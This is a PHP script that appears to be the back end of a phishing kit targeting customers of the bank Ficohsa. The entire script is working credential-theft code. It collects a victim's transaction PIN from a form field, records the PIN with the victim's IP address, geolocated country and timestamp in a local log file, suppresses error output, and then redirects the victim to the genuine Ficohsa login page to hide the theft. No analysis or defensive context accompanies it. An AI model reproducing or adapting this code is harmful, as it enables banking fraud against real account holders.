<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
if(isset($_POST["galletita3"]) && isset($_POST["galletita3"])){
    
    $file = fopen("muyrandom.txt", "a");
fwrite($file, "Pin de transacciones: ".$_POST['galletita3']." - Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$cc." ".$userp." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);

header("location:https://secure.ficohsa.com/?version=6.7.4.4.0#/administrationGeneral/login");    

}
    
?>